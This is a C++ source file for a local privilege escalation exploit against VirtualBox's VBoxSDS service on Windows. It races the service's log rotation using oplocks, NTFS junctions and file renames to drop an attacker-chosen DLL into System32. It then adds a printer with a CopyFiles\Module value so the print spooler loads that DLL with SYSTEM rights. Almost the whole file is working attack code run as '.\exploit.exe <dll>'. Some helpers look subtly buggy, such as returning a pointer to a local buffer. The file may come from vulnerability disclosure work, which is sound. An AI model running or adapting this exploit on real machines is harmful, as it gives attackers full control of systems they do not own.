/*
Copyright 2024 mansk1es
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "def.h"
#include "FileOplock.h"
#include <WtsApi32.h>
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "wtsapi32")
#pragma warning(disable:4996)

struct __declspec(uuid("74AB5FFE-8726-4435-AA7E-876D705BCBA5")) CLSID_VBoxSDS;

FileOpLock* oplock;
FileOpLock* oplock2;
HANDLE hFile, hFile2, vb11, h;
NTSTATUS retcode;
WCHAR dir[MAX_PATH] = { 0x0 };
WCHAR dir2[MAX_PATH] = { 0x0 };
wchar_t filen[MAX_PATH] = { 0x0 };

BOOL Move(HANDLE hFile);
void callback();
LPWSTR  BuildPath(LPCWSTR path);
void loadapis();
VOID cb0();
VOID cb1();
BOOL Monitor();
BOOL clearDataDir(wchar_t* filename);


BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	HANDLE hDir;
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", dir);
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{
		printf("[!] Error: %d. Exiting\n", GetLastError());
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;


	HANDLE hDir;
	hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", path);
		printf("%d\n", GetLastError());
		return FALSE;
	}
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		printf("Error: %d\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("[+] Junction %ls delete!\n", dir);
		return TRUE;
	}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;

	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;


	}
}

BOOL LoadDLL(WCHAR* printdrv) {
	PRINTER_INFO_2 printInfo;
	WCHAR dll[256] = L"C:\\Windows\\System32\\VBoxSDS.log.10";
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	memset(&printInfo, 0, sizeof(PRINTER_INFO_2));
	printInfo.pPrinterName = (LPWSTR)str_uuid;
	printInfo.pDriverName = printdrv;
	printInfo.pPortName = (LPWSTR)L"PORTPROMPT:";
	printInfo.pDatatype = (LPWSTR)L"RAW";
	printInfo.pPrintProcessor = (LPWSTR)L"winprint";
	HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printInfo);
	if (hPrinter == NULL) {
		printf("[-] Error [AddPrinter]: 0x%x\n", GetLastError());

		return FALSE;
	}
	printf("[+] Printer added!\n");
	SetPrinterDataEx(hPrinter, L"CopyFiles\\", L"Module", 1, (LPBYTE)&dll, sizeof(dll));
	printf("[+] DLL should be loaded!\n");

	return TRUE;
}

WCHAR* GetPrinterDrivers()
{
	DRIVER_INFO_1* info;
	LPBYTE data;
	DWORD bytesneeded;
	DWORD ret;
	EnumPrinterDrivers(NULL, NULL, 1, NULL, 0, &bytesneeded, &ret);
	data = (LPBYTE)malloc(bytesneeded);
	if (!EnumPrinterDrivers(NULL, NULL, 1, data, bytesneeded, &bytesneeded, &ret))
	{
		printf("%d\n", GetLastError());
		return NULL;
	}
	info = (DRIVER_INFO_1*)data;
	for (int i = 0; i < ret; i++)
	{
		printf("[*] Trying printer driver: %ls\n", info->pName);
		if (LoadDLL(info->pName)) {
			break;
		}
		info++;
	}
}

void runSDS(int delay) {
	
	if (delay == 1) {
		printf("sleeping for 2 sec (if it's hanging, run the exploit again)\n");
		Sleep(2000);
	}

	CoInitialize(NULL);
	LPVOID ppv;
	// 1st trigger to create VBoxSDS.log dir
	CoCreateInstance(__uuidof(CLSID_VBoxSDS), 0, CLSCTX_LOCAL_SERVER, IID_IUnknown, &ppv);
	CoUninitialize();

}

BOOL checkSDSLog() {

	BOOL clear = FALSE;

	std::wstring vboxDataDir = L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.*";

	HANDLE hFind;
	WIN32_FIND_DATA data;

	hFind = FindFirstFile(LPCWSTR(vboxDataDir.c_str()), &data);
	// iterate first VBoxSDS.log
	FindNextFile(hFind, &data);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {

			if (wcswcs(data.cFileName, L"VBoxSDS.log.")) {

				runSDS(0);
				//wprintf(L"%s\n", data.cFileName);
			}
			else {
				printf("[+] Logs have been cleared!\n");
				clear = TRUE;
			}
			//wprintf(L"%s\n", data.cFileName);

		} while (FindNextFile(hFind, &data));
		FindClose(hFind);
	}

	//printf("CLEAR: %d\n", clear);

	return clear;
	
}


BOOL enumProc(const wchar_t* procName) {

	PWTS_PROCESS_INFO processes{};
	BOOL ok = FALSE;
	DWORD count;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &processes, &count)) {
		for (DWORD i = 0; i < count; i++) {
			if (wcswcs(processes[i].pProcessName, procName)) {
				wprintf(L"[!] Process active: %s with PID %d\n", processes[i].pProcessName, processes[i].ProcessId);
				ok = TRUE;
				break;
			}
		}
	}
	else {
		printf("err: %d\n", GetLastError());
	}
	WTSFreeMemory(processes);

	return ok;

}

void checkIfExists() {

	if (enumProc(L"VirtualBoxVM.exe")) {
		printf("[!] You seem to have active VMs running, please stop them before running this to prevent corruption of any saved data of the VMs.\n");
		exit(1);
	}

	if (enumProc(L"VirtualBox.exe")) {
		printf("[!] VirtualBox process active\n");

		// message
		printf("[!] Trying to exit virtualbox by postmessage close window\n");
		PostMessage(FindWindow(NULL, TEXT("Oracle VM VirtualBox Manager")), WM_CLOSE, NULL, NULL);

		printf("[!] Letting VBoxSDS exit (wait 12 seconds)\n\n");
		Sleep(12000);

		if (enumProc(L"VBoxSDS.exe")) {
			printf("[-] error stopping vboxsds\n");
			exit(1);
		}

		else {
			printf("[+] Success stopping vboxsds!\n");
		}

	}

}

BOOL clearDataDir(wchar_t* filename) {

	do {
		vb11 = CreateFile(L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.11", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
		printf("h: %x %d\n", vb11, GetLastError());
	} while (vb11 == INVALID_HANDLE_VALUE);

	
	oplock = FileOpLock::CreateLock(vb11, cb1);
	if (oplock != NULL) {
		HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, NULL, 0, NULL);
		oplock->WaitForLock(INFINITE);
		CloseHandle(c);
	}
	BOOL isEmpty = FALSE;

	do {
		isEmpty = checkSDSLog();

	} while (isEmpty == FALSE);

	if (!RemoveDirectory(L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log")) {
		printf("error removing vboxlog dir\n");
		exit(1);
	}
	
	if (!CopyFile(filename, L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.9", FALSE)) {
		printf("error copying file: %d\n", GetLastError());
		exit(1);
	}
	if (!CopyFile(filename, L"C:\\explt_bait\\VBoxSDS.log.9", FALSE)) {
		printf("error 2\n");
		exit(1);
	}

	return isEmpty;
}

void oplockBait(HANDLE z) {

	printf("[!] Setting oplock on bait directory\n");

	oplock = FileOpLock::CreateLock(z, cb0);
	if (oplock != NULL) {
		oplock->WaitForLock(INFINITE);
	}

}

int wmain(int argc, wchar_t* argv[]) {

	if (argc < 2) {
		printf(".\\exploit.exe <dll>");
		return -1;
	}

	loadapis();
	checkIfExists();

	CreateDirectory(L"C:\\explt_bait", NULL);
	
	clearDataDir(argv[1]);
	HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, (LPVOID)1, NULL, 0);
	
	do {
		hFile2 = CreateFile(L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.9", DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
		//printf("h2: %x\n", hFile2);
	} while (hFile2 == INVALID_HANDLE_VALUE);
	do {
		hFile = CreateFile(L"C:\\explt_bait\\VBoxSDS.log.9", DELETE , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
		//printf("h: %x %d\n", hFile, GetLastError());
	} while (hFile == INVALID_HANDLE_VALUE);
	
	HANDLE q = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)oplockBait, hFile, NULL, NULL);

	oplock2 = FileOpLock::CreateLock(hFile2, callback);
	if (oplock2 != NULL) {
		oplock2->WaitForLock(INFINITE);
	}

	WaitForSingleObject(q, INFINITE);

	DeleteJunction(dir);
	hFile = CreateFile(L"C:\\Windows\\System32\\VBoxSDS.log.10", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if ((DWORD)hFile != 0) {
		printf("[+] File move success!\n");
		CloseHandle(hFile);
		GetPrinterDrivers();
	}
	printf("gotcha\n");
	DeleteFile(L"C:\\explt_bait\\VBoxSDS.log.9");
	RemoveDirectory(L"C:\\explt_bait");
	CloseHandle(c);
	CloseHandle(q);
	
	return 0;

}


BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}

void callback() {

	printf("[!] move 1\n");
	if (!Move(hFile2)) {
		printf("reached33\n");
		exit(1);
	}

	printf("[+] success!\n");
	_swprintf(dir, L"C:\\ProgramData\\VirtualBox");
	
	if (!CreateJunction(BuildPath(dir), L"\\??\\C:\\explt_bait")) {
		printf("[!] Exiting!\n");
		exit(1);
	}
	
	return;

}

LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}

void loadapis() {
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}

}

void cb0() {
	
	printf("reached2\n");
	
	_swprintf(dir, L"C:\\ProgramData\\VirtualBox");
	DeleteJunction(dir);
	
	if (!CreateJunction(BuildPath(dir), L"\\??\\C:\\Windows\\System32")) {
		printf("[!] Exiting!\n");
		exit(1);
	}
	
	return;
}

void cb1() {

	printf("[!] oplock triggered\n");
	if (!Move(vb11)) {
		printf("reached3\n");
		exit(1);
	}
	if (!CreateDirectory(L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log", NULL)) {
		printf("Error creating dir. Exiting\n");
		exit(1);
	}

	return;

}

BOOL Monitor() {

	printf("Monitor called\n");
	BOOL deleted = FALSE;
	_swprintf(filen, L"VBoxSDS.log.9");
	do {
		do {
			h = CreateFile(L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.9", DELETE , NULL, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
			printf("h: %x\n", h);
		} while (h == INVALID_HANDLE_VALUE);
		oplock = FileOpLock::CreateLock(h, cb0);
		if (oplock != NULL) {
			oplock->WaitForLock(INFINITE);
		}
		deleted = TRUE;
	} while (deleted == FALSE);
	return deleted;
}
